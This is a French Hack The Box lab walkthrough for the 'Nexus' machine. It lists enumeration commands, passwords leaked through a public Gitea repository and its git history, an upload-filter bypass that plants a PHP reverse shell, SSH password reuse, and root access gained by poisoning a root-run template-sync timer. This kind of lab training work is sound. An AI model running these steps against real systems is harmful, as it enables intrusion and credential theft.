@@ -1,0 +1,288 @@
+HTB Nexus - Notes de Lab (Version Organisée)
+Informations générales
+Cible
+IP : 10.129.234.54
+Domaine : nexus.htb
+Ajout DNS local
+echo "10.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
+
+1. Énumération initiale
+Scan Nmap
+nmap -T5 -sV -sC -Pn 10.129.234.54 -v
+
+Résultats
+Port	Service	Version22	SSH	OpenSSH 9.6p1
+80	HTTP	Nginx 1.24.0
+Informations supplémentaires
+OS : Linux (Ubuntu)
+Redirection automatique :
+http://nexus.htb
+2. Reconnaissance Web
+Site principal
+Serveur Web
+Nginx 1.24.0
+Aucune vulnérabilité connue identifiée immédiatement.
+Information découverte
+
+Email exposé :
+
+j.matthew@nexus.htb
+
+Scan Nikto
+nikto -h http://nexus.htb
+
+Résultats
+Aucun répertoire CGI trouvé.
+En-tête de sécurité manquant :
+Strict-Transport-Security (HSTS)
+
+3. Énumération des répertoires et sous-domaines
+Gobuster Directory
+gobuster dir -u http://nexus.htb \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+-r -c 200,301,302,403 \
+--exclude-length 166
+
+Gobuster VHOST
+gobuster vhost -u http://nexus.htb \
+-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+--append-domain \
+--domain nexus.htb \
+--exclude-length 166
+
+Sous-domaines découverts
+Sous-domaine	Résultatgit.nexus.htb	200 OK
+billing.nexus.htb	Redirect 302
+4. Analyse de Billing
+URL
+http://billing.nexus.htb/admin/login
+
+Application détectée
+
+Krayin CRM
+
+5. Analyse Gitea
+URL
+http://git.nexus.htb
+
+Version
+Gitea 1.26.0
+
+Dépôts accessibles publiquement
+/explore/repos
+
+Dépôt intéressant
+admin/krayin-docker-setup
+
+6. Recherche de secrets dans Git
+Fichier .env exposé
+APP_NAME='Krayin CRM'
+APP_ENV=local
+APP_DEBUG=true
+APP_URL=http://billing.nexus.htb
+
+IMAP_USERNAME=username1
+IMAP_PASSWORD=password1
+
+DB_HOST=krayin-mysql
+DB_DATABASE=krayin
+
+docker-compose.yml
+
+Informations observées :
+
+MYSQL_USER: krayin
+MYSQL_PASSWORD: ${DB_PASSWORD}
+MYSQL_ROOT_PASSWORD: ${DB_ROOT_PASSWORD}
+
+Historique Git
+
+En inspectant l'historique du dépôt :
+
+DB_PASSWORD=N27xh!!2ucY04
+
+7. Compromission de Krayin CRM
+Connexion réussie
+
+Identifiants :
+
+Utilisateur : j.matthew@nexus.htb
+Mot de passe : N27xh!!2ucY04
+
+Vulnérabilité identifiée
+Application vulnérable
+Krayin CRM 1.26.0
+
+CVE
+CVE-2026-38526
+
+Impact
+Upload PHP non filtré.
+Remote Code Execution (RCE).
+Endpoint concerné
+/admin/tinymce/upload
+
+8. Obtention du shell initial
+Technique utilisée
+Upload d'un reverse shell PHP (PentestMonkey).
+Renommer le fichier en :
+shell.php.png
+
+Intercepter la requête avec Burp Suite.
+Modifier le nom du fichier.
+Retirer l'extension .png.
+Exécuter le shell.
+Shell obtenu
+uid=33(www-data)
+gid=33(www-data)
+
+
+Utilisateur compromis :
+
+www-data
+
+9. Stabilisation du shell
+Upgrade TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+Résultat :
+
+www-data@nexus:/$
+
+10. Découverte de nouveaux identifiants
+Répertoire Krayin
+~/krayin
+
+Fichier .env
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_DATABASE=krayin
+
+DB_USERNAME=krayin
+DB_PASSWORD=y27xb3ha!!74GbR
+
+11. Mouvement latéral
+Test SSH
+
+Utilisation du nouveau mot de passe sur l'utilisateur Jones :
+
+ssh jones@10.129.234.54
+
+Succès
+uid=1000(jones)
+gid=1000(jones)
+
+12. Énumération locale
+Recherche SUID / SGID
+find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null
+
+Résultat
+Aucun vecteur intéressant identifié.
+Variables d'environnement
+printenv
+
+Résultat
+Rien d'utile.
+13. Identification de la piste PrivEsc
+Timers Systemd
+systemctl list-timers
+
+Service intéressant
+gitea-template-sync.timer
+
+
+Exécution :
+
+Toutes les 2 minutes environ
+
+
+Service associé :
+
+gitea-template-sync.service
+
+14. Analyse de Gitea
+Répertoire
+/etc/gitea
+
+Fichiers présents
+app.ini
+template-sync.conf
+template-sync.py
+
+
+Le service semble synchroniser automatiquement des dépôts Git templates.
+
+15. Génération d'une clé SSH
+ssh-keygen -t ed25519 -f /tmp/.k -N ''
+
+Résultat
+
+Création :
+
+/tmp/.k
+/tmp/.k.pub
+
+16. Création du dépôt malveillant
+Depuis le compte Jones
+
+Création d'un dépôt vide :
+
+rce
+
+
+Défini comme template Gitea.
+
+Clonage local
+git -c http.curloptResolve="git.nexus.htb:80:10.129.234.54" \
+clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
+
+17. Exploitation du mécanisme de synchronisation
+Préparation du dépôt
+touch README.md
+
+
+Ajout d'un script Python personnalisé visant l'escalade de privilèges.
+
+Push du dépôt
+git -c http.curloptResolve="git.nexus.htb:80:10.129.234.54" \
+push -u origin main --force
+
+18. Validation de l'exécution
+
+Après le déclenchement du timer :
+
+cat /var/log/template-sync.log
+
+
+Les logs confirment l'exécution du code injecté.
+
+19. Obtention de Root
+
+Connexion via la clé SSH ajoutée par le processus compromis :
+
+ssh -i /tmp/.k root@10.129.234.54
+
+Résultat final
+Root compromise achieved.
+
+Résumé de la Kill Chain
+Initial Access
+Énumération Web.
+Découverte des sous-domaines.
+Accès au dépôt Git exposé.
+Extraction de secrets depuis Git.
+Exploitation
+Connexion à Krayin CRM.
+Exploitation de la vulnérabilité d'upload.
+Obtention d'un shell www-data.
+Post Exploitation
+Extraction de nouveaux secrets dans .env.
+Réutilisation du mot de passe pour SSH.
+Accès au compte jones.
+Privilege Escalation
+Découverte du service gitea-template-sync.
+Abus du mécanisme de synchronisation de templates Gitea.
+Injection de code exécuté par le service.
+Ajout d'une clé SSH root.
+Connexion root via SSH.
